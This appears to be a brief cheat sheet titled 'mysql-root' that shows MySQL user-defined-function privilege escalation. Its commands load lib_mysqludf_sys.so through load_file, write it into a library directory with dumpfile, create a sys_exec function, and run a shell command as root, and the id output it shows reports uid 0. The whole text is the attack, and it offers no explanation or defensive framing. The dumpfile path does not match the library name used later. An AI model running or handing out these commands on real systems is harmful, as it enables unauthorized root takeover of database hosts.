# mysql-root

mysql> create table npn(line blob);

mysql> insert into npn values(load_file('/home/npn/lib_mysqludf_sys.so'));

mysql> select * from npn into dumpfile '/usr/lib/lib/_mysqludf_sys.so';

mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';

mysql> select sys_exec('id > /tmp/out; chown npn.npn /tmp/out');

cd ~/

id

uid=0(root) gid=0(root groups=0(root)

